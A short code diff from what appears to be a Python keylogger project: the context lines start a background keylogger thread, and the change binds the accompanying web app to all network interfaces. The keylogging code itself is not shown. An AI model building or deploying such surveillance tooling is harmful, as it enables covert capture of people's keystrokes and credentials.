@@ -69,4 +69,4 @@ if __name__ == "__main__":
     keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
     keylogger_thread.start()
 
-    app.run(host="192.168.0.104", port=5000, debug=False) #Give your IP Address over here in the host section
+    app.run(host="0.0.0.0", port=5000, debug=False) #Give your IP Address over here in the host section
